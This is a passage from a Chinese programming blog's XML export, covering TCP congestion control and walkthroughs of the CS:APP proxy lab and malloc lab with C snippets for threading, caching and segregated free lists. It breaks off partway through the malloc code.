当一条TCP连接开始时，cwnd通常设置为一个较小值(一个MSS)。当第一个发送的包确认到达时，cwnd的值加上一个MSS，于是，第二次发送了两个报文段，同理，当两个报文段都收到时，第三次发送四个报文段，依次类推。当收到一个超时指示的丢包事件时，TCP发送方将cwnd置为1，并重新开始慢启动过程，并且设置慢启动阈值(ssthresh)记为cwnd/2。此后，若当前的cwnd达到或超过了ssthresh，则不再翻倍，而是进入拥塞避免状态。 拥塞避免 为了避免拥塞，在该状态下，每个RTT内(不是每次收到ACK)，cwnd的值只增加一个MSS。TCP发送速率呈较稳定的增长状态。当出现超时指示的丢包事件时，同样的ssthresh被更新为cwnd的一半，同时，cwnd被记为一个MSS。当然，如果出现3个冗余ACK指示的丢包事件时，TCP将cwnd的值减半(为了更好的测量结果，cwnd还应该再加上3个MSS)，更新ssthresh的值，同时进入快速恢复状态。 快速恢复 注意，该状态对TCP来说不是必备的。 在快速回复中，对于造成进入快速恢复状态的ACK，每当收到一个冗余的该ACK时，cwnd增加一个MSS，最终，当丢失报文段的ACK到达时，TCP在降低cwnd后进入拥塞避免状态。同时，如果出现了超时事件，则进入慢启动状态。 如下为一个TCP拥塞窗口演化实例： 小结 从上面的拥塞窗口演化图中，我们可以看到，当进入快速回复状态，很明显传输的效率要高一些，当然，我们也发现，如果网络稳定的话，拥塞窗口将呈现一个锯齿状的状态。当今已经有很多算法可以优化这一点，避免了锯齿状的发生。由于慢启动的原因，如果RTT本身就很大的话，这将很大程度上影响用户的体验。对此，有一个解决方式是，部署一个临近用户的前端服务器，在该服务器上利用TCP分岔来分裂TCP连接。即用户向该服务器发送请求，该服务器进行以一个很大的窗口向数据中心维护一条TCP连接，这样的话，响应时间能从大概4RTT降低到RTT。 Some Detail 1. 端口并不是一个物理层面的概念，而是一个抽象概念。它仅仅是协议栈中的两个字节。 2. TCP和UDP协议可以“监听”同一个端口，两者之间互不干扰。主机在进行多路分解时，是根据{ 协议， 目的端口号， 目的地址， 源端口号， 源地址 }来判断数据是属于哪一个套接字的。 3. 通常情况下，对于某一个特定的协议而言，一个端口号只能对应一个socket，但有例外。比如在创建socket并调用listen方法后，再fork出子进程，此时由于父子进程之间共享了文件描述符，监听的是同一个socket。在linux3.9(不是很确定)以后，当有连接请求时，内核自动选择唤醒某个进程对请求进行处理。在此之前则会唤醒所有进程，并让其中的某一个处理事件。]]></content>
      <categories>
        <category>Network</category>
      </categories>
      <tags>
        <tag>Network</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[csapp-Proxylab]]></title>
    <url>%2F2019%2F02%2F22%2Fcsapp-Proxylab%2F</url>
    <content type="text"><![CDATA[序 这是csapp系列的第八篇文章。具体题目请见官网。本文主要讲csapp中的proxy lab的一些问题以及解决办法。如果有什么写得不好的地方，欢迎联系我修改(右下角小图标点开即可对话，可能要稍微等一会)。 建议在开始实验以前，先把官方的资料看下。不然很可能不知道应该从哪里开始下手。当然，对实验的要求理解清楚之后，做起来还是很简单的(比起上一个实验的话)。 malloc lab 这个实验，要求我们完成一个网络代理，共分为三个部分： A. 完成基础的代理的功能B. 在上一步的基础上实现多线程C. 在上一步的基础上添加缓存功能 具体实现时，可以在实验文件目录下，使用命令 ./driver.sh ，将自动进行测试。其中，第一部分40分，其余各15分，满分为70。但本实验的测试比较水，基本不需要考虑效率的问题，因此难度更降了一层。并且，csapp.c文件中将我们需要的大量的函数都进行了包装，直接调用即可。tiny.c文件也为我们写好了，在完成的时候，可以直接先复制过来。并且，后面B和C部分其实照着书打也就可以拿到满分了。 some notice 1. 在笔者的电脑上(arch linux系统)，使用 ./driver.sh 命令时，发现报错了，显示 command not found 。解决的办法时安装需要的对应软件。在arch下，下载net-tools包即可解决，其他系统应该也是类似的。 2. 在bash中，可以使用命令 ./tiny 46350 &amp; ，在46350端口运行server，并且在后台运行，方便调试。具体可能会用到的还有以下这些命令(具体作用不清楚的话可以查一下)： kill pidfg jidbg jidjobs 3. 当完成某个部分时，可以使用命令 curl –proxy localhost:46351 localhost:46350 在本地对代理进行测试，并且可以在文件中输出一些信息，有利于调试。 4. 和服务器建立连接后，记得把文件描述符回收了，否则不仅占用资源，甚至会导致文件描述符不够用的情况。还有，要十分小心内存泄漏的问题，比如本实验中可能会用到malloc函数，别忘了回收。还有part B部分需要用到多线程，记得使用在子线程中使用pthread_detach(pthread_self())，保证线程资源能自动被系统回收。(也可以使用pthread_join()函数)。 实验正文 如果需要完整代码，请见github，仅供参考。本处仅讲几个比较重要的点。 http协议 想要完成本实验，必须对http协议的基本结构有一定的了解。因此，这里给出一个简单的http请求。 GET / HTTP/1.1Host: localhostContent-Length: 40Connection: close &lt;html>…&lt;/html> 如上。第一行为请求行，格式为”%s %s %s”，三个字符串间均有一个空格。其中，第一个字符串表示的是请求的类型(GET或HEAD或POST等)；第二个字符串表示的是文件的位置，如果以‘/’字符结尾，则自动加上index.html(或home.html)；第三个字符串表示的是版本，一般为“HTTP/1.1”，但这个实验要求我们向server发送信息时必须使用“HTTP/1.0”。 第二行开始是请求头，连续若干行，表示该请求相关的一些信息等。在本实验中，请求头需要有以下内容： Connection: closeProxy-Connection: close 用来表示服务端与用户端仅进行一次数据交换。在HTTP/1.0中，默认情况下是“Keep-Alive”。 请求头后有一个空行，这里要注意一下，该空行用来分离请求头与请求数据，不能省略。 随后的若干行均为请求数据，可以包含任意数据。 对于响应消息，其实和请求很相似。 HTTP/1.0 200 OKServer: Tiny Web ServerConnection: closeContent-length: 115Content-type: text/html Welcome to little_csd.netThanks fot you visited. 如上面为一个简单的相应信息。第一行为状态行，同样包含三个以单个空格隔开的字符串。第一个字符串表示协议，在这里是“HTTP/1.0”，第二个字符串表示的是状态码，第三个字符串表示的是状态消息，和状态码相对应。正常情况下，状态码和状态消息应该分别为”200”和“OK”。 第二行开始为消息报头，为客户端提供一些关于响应消息的信息，比如消息长度(仅含正文)，消息类型等。 消息报头后紧接着又是一个空行，用来分隔。最后是响应正文。 有一点值得注意的是，http协议中，换行是由回车符‘\r’和换行符’\n’组成的，每一行结尾都需要添加这两个字符。 实现代理的基本思路 首先，我们必须明白代理是干什么用的。这样才能准确清楚我们要做什么。如同字面上的意思，代理起到一个类似中间商的作用。当我们利用代理访问某些网络资源的时候，我们客户端首先向代理发送信息，告诉它我们要访问的资源的位置。然后，代理就代替我们访问该资源(比如发送HTTP请求给服务端)，服务端收到访问请求之后，将资源传回给了代理，代理接收后，又发送到我们客户端这边。这样我们就成功地间接访问到了该网络资源。这里以访问www.google.com 为例，用一张简单的图来说明一下。 那么，为什么我们不能直接访问www.google.com 呢？答案显而易见了，www.google.com 被墙屏蔽了，在中国大陆境内访问不了(ipv4协议下)。因此，这就是代理的好处之一。通过访问另一台在墙外的主机，由它帮我们去访问一些被墙的网站，然后再返回给我们，这样我们就成功地间接访问到了我们想要的资源了。 当然，代理还有另一个重要的好处，它可以便于我们实现缓存。我们知道，如果我们每次都直接访问服务器，那么势必会给服务器带来巨大的压力，甚至导致服务器瘫痪。而我们如果代理的时候，它可以自动进行页面的缓存，这样下一次我们再访问同一个资源的时候，代理就不需要向服务器发送请求，直接从本地的缓存中拿出页面文件，然后送回给我们即可，这同时也提高了访问的效率。 好了，接下来我们考虑如何实现了。考虑到同样需要监听某个端口，我们可以直接复制tiny.c中的代码，进行适当的修改即可。(事实上我们只需要更改响应的逻辑)。 和客户端建立连接之后，我们需要读取客户端发送过来的请求，然后进行解析，得到客户端想要访问的主机，然后和对应的主机建立连接，发送HTTP请求(这里要十分注意HTTP请求的格式问题，容易出错)。然后，接收服务端的响应消息，原封不动地传回给客户端即可。1234567GET http://localhost:46350/ HTTP/1.1Host: localhost:46350User-Agent: curl/7.63.0Accept: */*Proxy-Connection: Keep-AliveGET http://localhost:46350/ HTTP/1.1 上面展示的是，使用之前提到的curl命令后，代理收到的请求。我们只需要取请求头的url，获取主机(这里为localhost)，端口号(这里为46350)，文件位置为’/‘，然后我们只需要制作一个HTTP请求发给服务器即可。在我的proxy实现中，HTTP请求如下：123456GET / HTTP/1.0Host: localhost:46350Connection: closeProxy-Connection: closeUser-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36 // 这个空行别漏了 添加多线程 前面说到了实现代理的基本思路，然而实际的服务器如果这样做的话，效率是很低的。我们一次只能处理一个访问请求，这样不合要求。因此，我们可以采用多线程的方法，通过多个线程一起工作来处理消息。当然，最简单的方法是，当接收到一个消息的时候，我们就创建一个线程，然后对消息进行处理。尽管这样就可以拿到该部分的满分了，但我们知道，创建一个线程，对系统来说时间和资源的开销是比较大的，每次接收到消息后就创建线程显然是不明智的，会导致时间上的浪费。因此，在这里我选择了采用预线程化的方法(类似与java中的线程池)，加上书中提到的producer-consumer模式来完成。123456789void *doit(void *vargp)&#123; Pthread_detach(pthread_self()); while (1) &#123; int connfd = sbuf_remove(&amp;sbuf); // 从消息队列中移除某个消息并返回，这里会阻塞 forward(connfd); // 处理某个客户端的消息 Close(connfd); &#125;&#125; 我们选择在一开始就创建线程，然后让线程进入上述函数，这样它就进入了一个无限的循环当中。在sbuf_remove函数中，如果消息队列为空，线程将一直被阻塞，直到拿到消息。sbuf_t相关的一些函数如下，基本的写法其实和书里是一样的。12345678910111213typedef struct &#123; int* buf; // 队列数组 int n; // 队列最大容量 int front，rear; // 用于构造队列 sem_t mutex; sem_t slots; sem_t items;&#125; sbuf_t;void sbuf_init(sbuf_t *sp, int n);void sbuf_deinit(sbuf_t *sp);void sbuf_insert(sbuf_t *sp, int item);int sbuf_remove(sbuf_t *sp); 添加缓存 对于一个比较完善的代理而已，缓存是不可或缺的。要实现缓存，我们需要把代理接收到的服务器的消息保存下来以及请求地址保存下来，然后，每次收到一个消息的时候，我们需要先在缓存中查找，如果在缓存中发现之前有过一个同样的请求，那么只需要直接从缓存中拿出，然后放回给客户端即可。 当然，这里又有另外一个问题，就是我们的缓存策略。正常情况下，比较恰当的缓存方法应该是LRU。当然，这里我偷懒了，采用的是FIFO，即先进先出策略。当缓存的页面数已满或者缓存的总大小超过了我们的设定的上限的时候，我们就将最远的一个缓存对象从缓存中移除。具体的写法见下：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869typedef struct &#123; char cache[MAX_OBJECT_SIZE]; // 页面的内容 char dst[MAXLINE]; // 请求地址 int size; // 页面大小&#125; web_obj; // 缓存的对象typedef struct &#123; web_obj* obj; // 缓存对象，这里是一个数组 int size_all; // 所有缓存对象页面内容的总大小 int n; // 缓存对象数的最大值 int objn_cnt; // 当前缓存的对象数 int read_cnt; // 用于 int front, rear; // 用于队列的构造 sem_t mutex; // web_cache访问锁 sem_t write; // 写入的锁，这里采用了读者优先模式&#125; web_cache;void cache_init(web_cache *cache, int n)；void cache_remove(web_cache *cache, int pos);char* cache_find(web_cache *cache, char* dst)&#123; // 这里需要加锁操作 int i, n = cache-&gt;n; int l = (cache-&gt;front+1) % n, len = cache-&gt;objn_cnt; char *ans; for (i = 0; i &lt; len; i++) &#123; web_obj *obj = cache-&gt;obj + l; if (!strcmp(obj-&gt;dst, dst)) &#123; int size = obj-&gt;size; ans = Malloc(size); // 重新开辟一段存储空间 strcpy(ans, obj-&gt;cache); break; &#125; l = (l + 1) % n; &#125; // 这里将锁还回 if (i == len) return NULL; else return ans;&#125;void cache_put(web_cache *wcache, char *dst, char *cache)&#123; P(&amp;wcache-&gt;write); int cnt = wcache-&gt;objn_cnt, n = wcache-&gt;n; if (cnt == n) &#123; int pos = (wcache-&gt;front+1) % n; cache_remove(wcache, pos); &#125; int pos = (++wcache-&gt;rear) % n, size = strlen(cache); web_obj *obj = wcache-&gt;obj + pos; strcpy(obj-&gt;dst, dst); strcpy(obj-&gt;cache, cache); obj-&gt;size = size; wcache-&gt;size_all += size; wcache-&gt;objn_cnt++; while(wcache-&gt;size_all &gt; MAX_CACHE_SIZE) &#123; int pos = (wcache-&gt;front+1) % n; cache_remove(wcache, pos); &#125; V(&amp;wcache-&gt;write);&#125; 整个缓存的模型上面已经展示得很清楚了，但有几个需要十分小心的点。第一个是find的时候，由于有加锁的存在，我们可以保证在当前某线程在搜索的时候，所有缓存对象不会因写入而发生更改，并且，统一时间最多只能有一个线程在遍历缓存对象。但是，当缓存命中的时候，我们需要返回什么？如果直接将缓存对象的指针返回，看似是没有问题的，但该函数如果在还锁之后，线程突然被挂起，然后有另一个线程执行了写操作，恰好将我们返回的那个缓存对象覆盖了。这个时候之前的那个线程重新执行，它返回的指针指向的对象这个时候其实就已经发生变化了。这个一定要理解清楚。 因此，我们选择了将重新开辟一段存储空间，将缓存对象的页面内容放在上面，这个时候，正常情况下，这段空间的内容就不会被其他线程修改了，于是，页面的内容可以正确地返回给了调用它的函数。但是这里又有另一个问题，我们开辟了一段存储空间，同时也需要对其进行回收，因此这就要求了调用cache_find()的函数，在获得了页面对象并使用了之后，需要将该段内容回收。 summary 终于又到了总结的时候了。对这个实验，尽管难度不大，但我们还是可以从其中学会很多东西。比如HTTP请求和响应的一些格式问题，我们能从应用层了解到网络访问是如何实现的。并且，我们也了解到了多线程技术，正确地使用的情况下，可以很大程度上提高程序的效率，并且充分利用了多核CPU的计算能力。当然，这也同时带来了一系列的问题，比如多线程之间的竞争，处理不当会导致程序每次执行的结果都不一样。以及多线程之间共享对象的读写，我们引用了锁的概念，这又带来了一系列新的问题，当一个线程一直持有锁，会导致其他线程被饿死(starvation)，又或者一个线程持有锁的同时又被挂起，导致陷入了死锁(dead lock)，这一系列都是会对我们的程序造成很大影响的错误。由此，线程安全对与一个编程者而言，重要性不言而喻。 最后，还是要来对整个系列做一个小总结的。从去年12月初开始，到今天2月底为止，历时两个多月，终于把这CS:APP3e看完了，并且完成了所有的实验，大部分也都写了认真地写完了相应的博客。怎么说呢，这段时间对我来说收获确实还是很大的，从一个对系统底层几乎毫不了解的小萌新，到现在对CPU，程序等有了一个简单的认识，这一步的跨越还是很大的，很感谢推荐这本书给我的师兄们。 这个系列到今天为止应该也就结束了。很意外的是，基本上自己还是勉勉强强完成了当初给自己立下的flag。接下来的一段时间应该博客就不会有更新了，可能下一个考虑学一下计网吧(如果有可能的话，会做一下上面的实验并写几篇博客)。 皆さん、さよなら]]></content>
      <categories>
        <category>csapp</category>
      </categories>
      <tags>
        <tag>csapp</tag>
        <tag>proxy</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[csapp-Malloclab]]></title>
    <url>%2F2019%2F02%2F14%2Fcsapp-Malloclab%2F</url>
    <content type="text"><![CDATA[序 这是csapp系列的第七篇文章。具体题目请见官网。本文主要讲csapp中的malloc lab的一些问题以及解决办法。如果有什么写得不好的地方，欢迎联系我修改(右下角小图标点开即可对话，可能要稍微等一会)。 建议在开始实验以前，先把官方的资料看下。然后，本实验总体难度偏高，至少算是笔者目前花的时间最多的一个实验(算上各种调试，以及写博客花了大概三天吧)，强烈建议把书里显式分配列表的地方看得十分清楚再开始写，不然一开始会无从下手。同样的，本实验需要对数据的存储(chapter 2)，指针等内容有一定的了解，需要经常用到各种类型转换。 倘若你是在官网上下的文件的话，建议找一下完整的trace文件，官网中仅含有两个简单的测试文件，没办法进行较大的数据的测试。 mallco 的简单实现原理内存空间的申请 在不使用malloc的情况下，通常我们需要使用系统调用来获得内存，其中最主要有两个方式。 第一个是sbrk(brk)函数：123#include &lt;unistd.h&gt;int brk(const void *addr);void *sbrk(intptr_t incr); brk的作用是将堆顶指针设置为addr，失败返回0，成功返回1。而sbrk的作用是将堆顶指针增加incr个字节，成功返回新的堆顶地址。 第二种方法使用的是mmap函数，利用匿名映射来实现。123#include &lt;sys/mman.h&gt;void *mmap(void *start, size_t length, int prot, int flags, int fd, off_t offset);int munmap(void *start, size_t length); 其中，start指针表示想要映射的内存区域的起始地址，length为映射的大小，prot是保护标志，flags是映射的类型(匿名映射使用MAP_ANONYMOUS参数)，offset是偏移量。 munmap则是将映射的空间还给操作系统。 当然，mmap还有另一个重要的作用就是实现快速的I/O，它通过直接将文件映射到虚拟内存，可以直接对其进行读写操作，而不需要使用系统调用read/write，大幅度提高了速度。当然，它只适用于内容的更新，而不适用于内容的添加。同理，使用mmap还可以实现共享内存。 在实际的使用中，我们不可能每次需要内存的时候，都用sbrk或mmap函数(系统调用速度很慢)，这会大幅度降低我们程序的效率。通常我们采用的是一种类似于缓存的思想，使用sbrk函数向内核索取一大片的内存空间，然后，我们再使用一定的手段对这段空间进行管理，当这段空间不够用时，再向内核拿，这样就提高了效率。这也正是malloc函数库所起到的作用。 malloc &amp; free 简单来说，malloc函数主要是通过维护一个空闲列表来实现内存的管理的，具体涉及到的数据结构就是链表。对每一个内存块，我们使用链表将它们串在一起，当需要使用的时候，我们从链表中寻找大小适合的内存块，并且从空闲链表中删除，拿给用户。 当用户用完某个内存块的时候，我们就将其重新插入回空闲链表，这样就实现了简单的内存分配和释放。 但是，这样的实现很明显空间利用率太低了，如果我们当前有个10kb的块，而用户仅需要1kb，这个时候直接分配就过于浪费，因此我们需要对这个块进行切割，拿出1kb给用户，剩下9kb重新放回链表，这样就可以提高一定的利用率。 但我们又发现，如果一个很大的块一直被切割，最后剩下的都是一些零碎的内存块，这个时候我们如果需要一个很大的内存块，这就有问题了，因此，我们需要合并。将几个临近的空闲块合成一个大的块，这样在需要大块内存的时候才有办法。 malloc lab 这个实验，要求我们完成一个动态内存分配器，即模拟libc库中的malloc, free, realloc等函数的功能。本实验我们仅需在mm.c文件中修改，其他的文件我们不需要进行改动（原始的mdriver.c可能会报错，根据提示自行修改即可，或者也可以无视）。最后我们的成绩是用时间效率(每秒操作数)和空间效率(共用了多少空间)衡量。当然，在本实验中，最大的难点在于空间效率的利用上。 实验文件：mm.c 我们需要填写的文件mdriver.c 用于测试我们的程序memlib.c 模拟内存系统，含有mem_sbrk等函数 需要填写的函数：int mm_init(void)void *mm_malloc(size_t size)void mm_free(void *ptr);void *mm_realloc(void *ptr, size_t size); 实验要求及一些注意事项 在本实验中，尽量将所有的结构(链表头等)放在堆内存当中，尽量少定义全局变量。 64位与32位的问题。我们运行的机器应该是64位的，但是在目前csapp官网的makefile文件中有 -m 32 的编译选项，也就是说所有的指针均为32位，即占用4个字节，这点要注意。在某些linux系统中，电脑中可能没有对应的32位的库，因此在编译的时候会显示找不到库，根据自身系统自行下载即可。 本实验要求实现8-bytes对齐，也就是说，mm_malloc返回的指针均为8的倍数。 建议在确定好block的组织方式后，完成mm_check()函数，用于检查堆内存是否出现问题。 建议将trace文件夹放在mdriver所在文件夹中，并且更改config.h文件当中TRACEDIR的宏定义为#define TRACEDIR “traces/“。make之后就可以直接运行./mdriver进行全部测试也可以使用./mdriver -f 命令对某个文件进行测试 对于一些奇怪的段错误，不妨采用打印堆内存的信息，或者模拟指令，或者自己造一个小文件进行测试等。 在正式开始实验以前，请确保理解以下概念(包括各自的特点，优缺点等)： 1. 三种适配方式： - fitst fit - next fit - best fit 2. 三种空闲列表的组织方式 - implicit free list - explicit free list - segregated free list 3. 两种合并的方式 - immediate coalescing - deferred coalescing 4. 两种内存碎片 - internal fragmentation - external fragmentation 5. 空间列表的排序方式 - size order - address order 适配方式 first fit: 最为直接的办法。扫描所有的块，只要当前块的大小满足要求就使用，速度较快。但容易导致空闲列表中前面的块被不断地细分，而后面的一些块却一直迟迟得不到利用。 second fit: 扫描的时候，每次从上一次扫描的下一个块开始，这样可以使得整个列表的块都可以被使用，这使得效率更高。然而，实际应用中，作用也很有限，容易产生很大的空间浪费，造成大量碎片。 best fit：这种方式最大的好处是可以充分地利用空间。找到所有满足要求的块中最小的那一个，这样可以很大程度上避免浪费。当然，这也使得时间成本较高，尤其是如果空间链表的组织方式不太恰当的话，容易导致每次都要遍历一整个列表。 在本实验中，要拿到高分一般采用的是best fit。 列表的组织方式 implicit free list：这种方式最为简单，直接将所有的块(不管是否有分配)串在一起，然后遍历。这种方式可也使得块最小可以达到8 bytes。当然，这种方式效率很低，尤其是当块的数量较多的时候。 explicit free list：在每一个free 块中保存两个指针，将所有空闲的块组成一个双向链表。和隐式相比，这种方式最大的好处在于我们不需要遍历已经分配的块，速度上快了很多，当然，由于需要保存指针，所以每一个块最小为16 bytes。 segregated free list：这种方式的特点在于，根据块的不同大小，分成k组，组织成k条双向链表。分类的方式有很多，比如可以采用2的倍数的分类方式，{1},{2},{3~4},{5~8}……大小为6的块放在第四条链中，大小为3的块则放在第三条链中等等。在本实验中，笔者采用的分类是{1~16},{17~32},{33~64},{65~128},{129~256},{257,512},{513~1024},{1025~2048},{2049~4096},{4096~…}; 两种内存碎片 internal fragmentation：内部碎片，即是已经被分配出去（能明确指出属于哪个进程）却不能被利用的内存空间。比如当前我需要44 bytes的内存，然后malloc的时候分配到了一个48 bytes的块，这样的话，剩下的4 bytes的内存尽管我不需要用到，但是其他程序也无法使用，这就是内部碎片。 external fragmentation：外部碎片，即还没有被分配出去（不属于任何进程），但由于太小了无法分配给申请内存空间的新进程的内存空闲区域。这个比较难理解，这里用一张图来说明一下。 假设上面是内存的一部分。这个时候我如果想要一个大小为3 bytes的内存，我们发现尽管这部分总共有4 bytes的内存没有被我们用到，但是它们被隔开了，我们无法利用。因此，在这种情况下，内存中的这两个没有用到的部分就是外部碎片。需要注意的是，外部碎片和我们请求的大小有关。比如这个时候我要的如果是2 bytes大小的内存，我们发现中间的块是足够的，因此这个时候这个就不算外部碎片了。 about pointer （review） C语言的指针向来是一个难点，在这个实验中，我们需要对指针有一定的理解。本质上而言，指针和其他int，long等类型的数据的存储并没有什么区别，同样是一串数字，指针更多像是C语言为我们提供的地址的抽象，使得我们能够更好地利用地址。 对于一个特定的系统以及编译环境下，指针的大小一般是一样的，通常32位系统下为32位(4 bytes), 64位系统下为64位(8 bytes)。准确上说，指针指向的是所指对象的首个字节。如下图，在一个小端法的机器中，一个大小为0x10f的int型数据存放在地址为0x7b3c~0x7b3f(共4 bytes)的内存区域中。每个字节占用为一个存储单位，对应着一个特定的地址。 这个时候看下以下代码：123int n = 0x10f; // 假设n存放在上述的内存区域中int* p = &amp;n;printf("%p %p", p, p + 1); 输出应该是多少？答案是输出应该为0x7b3c 0x7b40。对于一个指针而言，+1代表着增加一个单位长度，对于int型，大小为4个字节，故一个单位长度大小为4，倘若这个时候n的类型为short，则p+1的值应该为0x7b3e，依此类推。注意，一般情况下，指针之间的加法和乘除法是没有意义的。 继续看以下代码：123int n = 0x10f;char* p = (char *)(&amp;n);printf("%d", *p); 这个时候的输出又是多少呢？答案是0xf。当我们使用取值符号时，得到的数字和指针的类型有关，同样是值为0x7b3c的指针，若类型为int，则应取四个字节，得到0x0000010f, 而如果是char类型的指针，得到的应该是0x0f，同理，若类型为long long，则得到的应该是0x000001120000010f。 因此，通过类型转换，我们可以实现很多意想不到的事情。 mm.c allocated block 和 free block的具体结构如下。其中，successor存的是当前链表中下一个block的地址，predecessor存的是上一个block的地址。通过链表的形式将free block 串联在一起。 注意，这里有一个细节，allocated block中我们将脚部去掉了。与此同时，为了起到和脚部相似的作用，我们在flag位置中，用第二个位来标记上一个block(注意，这里的上一个是指在堆内存中的上一个块，而不是链表中的)是被占用。这样，只有当该标志位为0的时候，我们才认为上一个块是空闲的，可以用来合并。 define 对于这个实验来说，良好的宏定义有助于我们的理解。笔者的宏定义如下(仅列出部分):12345678910111213141516171819202122/* rounds up to the nearest multiple of ALIGNMENT */#define ALIGN(size) (((size) + (ALIGNMENT-1)) &amp; ~0x7)#define PACK(size, alloc) ((size) | (alloc))#define GET(p) (*(unsigned int*)(p))#define PUT(p, val) (*(unsigned int*)(p) = (unsigned int)(val))#define GET_SIZE(p) (GET(p) &amp; ~0x7)#define GET_ALLOC(p) (GET(p) &amp; 0x1)#define GET_PREV_ALLOC(p) (GET(p) &amp; 0x2)#define HDRP(bp) ((char *)(bp) - WSIZE)#define FTRP(bp) ((char *)(bp) + GET_SIZE(HDRP(bp)) - DSIZE)#define NEXT_BLKP(bp) ((char *)(bp) + GET_SIZE(((char *)(bp) - WSIZE)))#define LAST_BLKP(bp) ((char *)(bp) - GET_SIZE(((char *)(bp) - DSIZE)))#define NEXT_PTR(bp) ((char*)(bp))#define LAST_PTR(bp) ((char*)(bp) + WSIZE)#define LINK_NEXT(bp) ((char *)GET(bp))#define LINK_LAST(bp) ((char *)GET(bp + WSIZE)) 全局变量 整个实验的全局变量如下： static void* start_pos; // 永远指向当前堆的最顶部static char* end_link_list; // 链表数组后的下一个块static char* start_link_list; // 链表数组的表头 因为本次实验要求最好将数据存放在堆当中，因此我们选择将各个大小的链表头存放在堆一开始的一段连续区间中。具体存放如下(在mm_init函数中执行)12345678910111213141516171819if ((start = (char*) mem_sbrk(14 * WSIZE)) == (char*) -1) return -1;PUT(start, 0); // size &lt;= 16， 因为最小的一个块大小为16，因此这里将size小于16的全部放在同一个链表当中PUT(start + WSIZE, 0); // size &lt;= 32PUT(start + 2 * WSIZE, 0); // size &lt;= 64PUT(start + 3 * WSIZE, 0); // size &lt;= 128PUT(start + 4 * WSIZE, 0); // size &lt;= 256PUT(start + 5 * WSIZE, 0); // size &lt;= 512PUT(start + 6 * WSIZE, 0); // size &lt;= 1024PUT(start + 7 * WSIZE, 0); // size &lt;= 2048PUT(start + 8 * WSIZE, 0); // size &lt;= 4096PUT(start + 9 * WSIZE, 0); // size &gt; 4096PUT(start + 10 * WSIZE, 0); // for alignmentPUT(start + 11 * WSIZE, PACK(8,1)); // the prologue blockPUT(start + 12 * WSIZE, PACK(8,1));PUT(start + 13 * WSIZE, PACK(0,3)); // the epilogue blockstart_pos = start + 14 * WSIZE;start_link_list = start;end_link_list = start + 10 * WSIZE; extend_heap 关于堆的拓展，我们需要注意到，每次拓展的大小都应该为8的倍数，这样才能保证8字节对齐。 其次，在拓展的时候，可以有一个小优化。假设我们需要拓展的大小为size。拓展时，我们先查看位于堆顶端的块，如果堆顶端是一个空闲的块，并且大小为msize的话，我们可以只拓展size - msize即可。这样的话可以在一定程度上提高空间利用率(针对某些比较特殊的数据效果很明显)。当然，这样的话也会使得整个程序效率降低(频繁使用mem_sbrk的话对程序性能的影响是很大的，这是一个系统调用)。 link_list 在本实验中，为了使用best fit，我们选择采用将链表按照从小到大的顺序排序，然后从头开始遍历链表，当遇到第一个满足要求大小的块，这个块就一定是最适合我们的。因此，我们每次插入某一个块的时候，别忘了要遍历链表，然后将该块放到正确的位置上，以维护链表的单调性。 find_fit 在寻找能放得下size个字节的最小的块的时候，我们有两种处理策略。笔者采用的方法如下：遍历当前的链表，寻找是否有满足要求的块，有的话就返回。另一种方法是只遍历size所在的链表，如果没有，直接返回NULL，交由后面堆去拓展。 第一种方法的话很明显时间上效率较低，但是能够保证较大的块能够被使用。后一种方法的话时间上效率较高，但是可能导致较大的某个块一直无法被利用，从而导致了空间的浪费。 123456789101112131415// getSizeClass 返回当前的size 值对应在第几条链表上static void* find_fit(int size)&#123; char* link_begin = start_link_list + WSIZE * getSizeClass(size); while(link_begin != end_link_list) &#123; char* cur_node = LINK_NEXT(link_begin); while(cur_node != NULL &amp;&amp; GET_SIZE(HDRP(cur_node)) &lt; size) &#123; cur_node = LINK_NEXT(cur_node); &#125; if (cur_node != NULL) return cur_node; link_begin += WSIZE; &#125; return NULL;&#125; malloc &amp; free 如下。有几个要注意的点。首先，分配内存的时候，我们需要一个大小至少为WSIZE(allocated block的头部) + size的块，且最小为16。如果小于16的话，会导致free的时候放不下，从而出现问题。其次，注意好标志位。free的时候下一个块的第二个标志位应该清零。以及free的时候，要顺便看下前后能不能合并，可以合并的话应该合并完后再插入到链表当中。123456789101112131415161718192021222324void *mm_malloc(size_t size)&#123; size_t newsize = MAX(ALIGN(size + WSIZE), 16), incr; void* addr; // 这里我用findFitAndRemove寻找满足要求的块，找到的话顺便删除，没找到则返回NULL if ((addr = findFitAndRemove(newsize)) == NULL) &#123; incr = MAX(CHUNKSIZE, newsize); extend_heap(incr / DSIZE); addr = findFitAndRemove(newsize); &#125; return place(addr, newsize);&#125;void mm_free(void *ptr)&#123; size_t size = GET_SIZE(HDRP(ptr)); size_t prev_alloc = GET_PREV_ALLOC(HDRP(ptr)); AND(HDRP(NEXT_BLKP(ptr)), ~0x2); // 标志位清零 PUT(HDRP(ptr), PACK(size, prev_alloc)); PUT(FTRP(ptr), PACK(size, prev_alloc)); PUT(NEXT_PTR(ptr), NULL); PUT(LAST_PTR(ptr), NULL); coalesced(ptr); // 这个很重要，记得合并&amp;插入链表&#125; place 这个函数单独拿出来是我们的放置策略的问题。这里，参考了网上某位大牛的写法(如果涉及侵权，请联系我修改)。具体为什么要这样写，该文章中说得已经很清楚了。这种写法主要是为了对应binary-bal文件。这里简单概括一下。 其实核心思想就是将大的块放在右侧，小的块放在左侧，然后当大的块free掉之后，就能形成一个更大的块来存放。其实更多情况下这更像是一种针对数据造函数的思想，当然，如果数据更改或者是一些顺序更换，这样的写法就有时候反而会导致效率极度下降。1234567891011121314151617181920212223242526272829static void* place(void* ptr, size_t size)&#123; size_t all_size = GET_SIZE(HDRP(ptr)), res_size = all_size - size; if (res_size &lt; 16) &#123; OR(HDRP(NEXT_BLKP(ptr)), 0x2); size = all_size; PUT(HDRP(ptr), PACK(size, 0x3)); &#125; else if (size &lt; 96) &#123; char* new_block = (char*)ptr + size; PUT(HDRP(new_block), PACK(res_size, 0x2)); PUT(FTRP(new_block), PACK(res_size, 0x2)); PUT(NEXT_PTR(new_block), NULL); PUT(LAST_PTR(new_block), NULL); add_node(new_block, getSizeClass(res_size)); PUT(HDRP(ptr), PACK(size, 0x3)); &#125; else &#123; char* new_block = (char*)ptr + res_size; PUT(HDRP(ptr), PACK(res_size, 0x2)); PUT(FTRP(ptr), PACK(res_size, 0x2)); PUT(NEXT_PTR(ptr), NULL); 